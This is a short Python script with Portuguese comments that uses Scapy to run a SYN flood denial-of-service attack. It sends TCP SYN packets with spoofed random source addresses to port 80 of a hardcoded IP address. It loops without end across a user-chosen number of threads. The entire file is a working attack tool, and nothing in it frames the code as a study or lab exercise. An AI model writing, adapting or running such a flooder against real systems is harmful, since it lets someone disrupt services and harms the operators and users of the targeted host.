from scapy.all import *
import threading
def flood():
        # Define o endereço IP de origem e destino
        src_ip = RandIP()
        dst_ip = '177.220.177.161'

        # Define o número de porta de origem e destino
        src_port = 1234
        dst_port = 80

        dado = b"ola tudo bem" * 50
        # Cria um pacote TCP SYN
        tcp_packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, seq=1505066, flags="S")/Raw(load=dado)

        # Envia o pacote
        limit = 0
        #while limit < 1050:
            #print(len(tcp_packet[TCP].payload))
        send(tcp_packet, loop=1, verbose=1)

n = int(input('Numero de thread: '))
for i in range(n):
        x = threading.Thread(target=flood)
        x.start()
